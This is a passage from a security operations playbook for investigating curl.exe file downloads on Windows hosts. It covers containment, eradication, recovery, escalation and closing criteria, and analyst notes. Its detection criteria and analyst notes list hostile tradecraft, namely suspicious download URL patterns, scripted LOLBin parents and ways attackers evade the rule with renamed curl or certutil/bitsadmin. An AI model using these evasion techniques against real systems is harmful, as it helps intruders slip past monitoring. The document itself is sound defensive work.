- **Block the source at the perimeter.** Give the proxy/network team the URL/host/IP recovered from the curl command line (§14.1/§15.2b) to block egress to the destination and to confirm out-of-band what was actually fetched.
- **Suspend or force-logoff `$user`'s session** on `$host` and **disable the account** pending investigation if the user context is implicated; reset its credentials (§20).
- **Capture and quarantine the fetched file** (the non-standard-path binary from §15.10) for analysis before it is deleted; **terminate the payload process and its descendants** (`$parent` tree from §15.3b/§17.5) if the host cannot yet be isolated.
- **Preserve volatile evidence first** where feasible (running process list, the file on disk, memory) — NBI does not collect the network fetch, so host-side and proxy-side capture are the only way to recover the destination and payload.
- Deploy/confirm changes only via the authorised human-approved DEPLOY path; investigation itself is read-only.

## 19. Eradication

- **Remove the downloaded payload** identified via §15.10 (its `process.executable` path) and any copies it wrote.
- **Remove persistence** discovered in §17.2 (services, scheduled tasks, Run keys, rogue accounts) that the payload installed.
- **Run a full anti-malware / EDR scan** on `$host` and hunt for the **same URL, destination IP, and payload hash** across peers — especially other jump/VDI hosts and any host `$user` touched (§15.4, §17.1).
- **Remediate the initial-access vector** that gave the attacker the foothold from which they ran curl (phishing, exposed service, credential reuse).

## 20. Recovery

- **Reset `$user`'s password** and any credentials that were accessible from `$host` during the compromised window; if privileged accounts logged on there (§17.3), rotate those too.
- **Restore `$host`** from a known-good image if the payload established persistence or tampering was extensive; otherwise validate that all eradication actions hold after reboot.
- **Return the host/account to service** only after §22 closing criteria are met and monitoring confirms no recurrence of the fetch or payload.
- Consider host hardening (§23) — application control to restrict curl on server-class hosts, tightened egress to known destinations, and enabling the command-line-auditing GPO on the jump/VDI tier so the URL is always captured.

## 21. Escalation Criteria

Escalate to Tier 3 / Incident Response (and notify the customer) when **any** of the following hold:

- A **suspicious/payload URL** (raw IP, non-corporate domain, high port, `.exe`/`.dll`/`.ps1`/`.bin` target, `-o` to temp/AppData) is recovered.
- A **downloaded binary is executing** from a non-standard path (§15.10) time-correlated to the curl fetch.
- The parent is a **scripted LOLBin** (`wscript`/`cscript`/`mshta`/`forfiles`) or an Office/browser ancestor (phishing-driven ingress).
- The curl call is on a **server / Tier-0 host**, or persistence / lateral movement / defence evasion is observed (§17).
- The **URL or whether a fetched file executed cannot be resolved** from the 4688 stream (command line/args empty) — escalate as **needs_escalation** with the gaps named and a proxy/EDR pull requested.

## 22. Closing Criteria

- **false_positive (authorised):** a change ticket, known installer, or documented automation is positively matched to the exact URL/destination + `$parent` + `$user` + time. Record the reference. Do not create a broad exception; if warranted, scope it to the exact destination + parent + user.
- **false_positive (blocked attempt):** the fetch is positively proven to have failed (host unreachable / HTTP error, nothing written or run); documented as a blocked attempt, **never "benign"**, with a check for any follow-on still performed.
- **misconfiguration:** a legitimate but unbaselined automation/script used curl for a benign transfer to a recognised destination with no payload execution; register the source/destination.
- **true_positive:** malicious ingress transfer confirmed (suspicious URL and/or downloaded binary executing); containment/eradication/recovery completed, scope of `$user`/`$host`/peers established, source blocked, and no residual payload or persistence on monitoring.
- **needs_escalation:** handed to Tier 3/IR with the specific evidence gaps (URL unresolved / execution unknown) documented.

In all cases: attach the ES|QL used and its results (INV/§14/§15 outputs), the entity values, the URL/destination file, and whether the fetched file executed, to the alert before closing.

## 23. Analyst Notes

- **Zero baseline = high fidelity.** Native `curl.exe` does not appear in NBI's 4-hour Windows telemetry. There is nothing legitimate to tune out, so this rule should be near-silent; when it fires, investigate it fully rather than pattern-matching to "probably a dev".
- **The network side is invisible here.** `logs-system.security*` has no `5156`/network events — the destination, port, bytes, and response are not in this index. The URL comes only from the curl command line/args; the *connection* must be corroborated via proxy/DNS/EDR. Empty is never proof of a failed or benign fetch.
- **Command-line capture is bimodal, and the "wrong" tier for this attack.** It is enabled on some servers but **absent on the jump/VDI hosts** where interactive curl is most plausible. Expect `process.command_line`/`process.args` to be null exactly where you most want the URL; enabling the "Include command line in process creation events" GPO on the jump/workstation class is the single highest-value hardening ask from this rule.
- **Non-standard-path ≠ malicious on jump hosts.** Validated example: `Mahmoud.Akram` on `nim-jump-apv02` runs `MoTTYnew.exe`/`XWin_MobaX.exe` from `AppData\Roaming\MobaXterm\...` — a benign SSH client. The §15.10 hunt will surface this; correlate to an actual curl fetch + suspicious URL before escalating.
- **`source.ip` is shared infrastructure.** A single VDI/jump egress IP (validated example: `10.11.102.15`) fronts many users. Never treat `source.ip` as an individual identifier; correlate IP + user + host.
- **Evasion to expect.** An attacker can run curl as SYSTEM (excluded by the rule), rename `curl.exe`, use `certutil`/`bitsadmin`/`certreq`/`Invoke-WebRequest` instead, or fetch over a non-`http` scheme. Complement this rule with proxy-side download detection and post-transfer new-binary-execution monitoring.
- **KB-worthy (persist to NBI customer scope):** (1) `curl.exe` zero-baseline over 4h on `logs-system.security*`; (2) no `5156`/process-network telemetry in this index (URL only from command line); (3) command-line/`process.args` host-bimodality (servers populated vs jump hosts null); (4) `process.hash.*` absent on 4688; (5) `10.11.102.15` = shared VDI/jump egress; (6) benign AppData tooling pattern on `nim-jump-apv02` (MobaXterm/MoTTY). All observed live on 2026-08-17.

## 24. References

- MITRE ATT&CK — Ingress Tool Transfer (T1105): https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK — Application Layer Protocol: Web Protocols (T1071.001): https://attack.mitre.org/techniques/T1071/001/
- MITRE ATT&CK — Command and Control tactic (TA0011): https://attack.mitre.org/tactics/TA0011/
- Elastic — "Potential File Transfer via Curl" prebuilt rule reference: https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/command_and_control_file_transfer_via_curl
- LOLBAS — Curl.exe: https://lolbas-project.github.io/lolbas/Binaries/Curl/
- curl manual (flags: `-o`/`-O`/`-k`/`--data`): https://curl.se/docs/manpage.html
- Microsoft Learn — Command line process auditing (Event 4688 command-line GPO): https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing
- Microsoft Learn — curl is now shipped in Windows: https://techcommunity.microsoft.com/t5/containers/tar-and-curl-come-to-windows/ba-p/382409


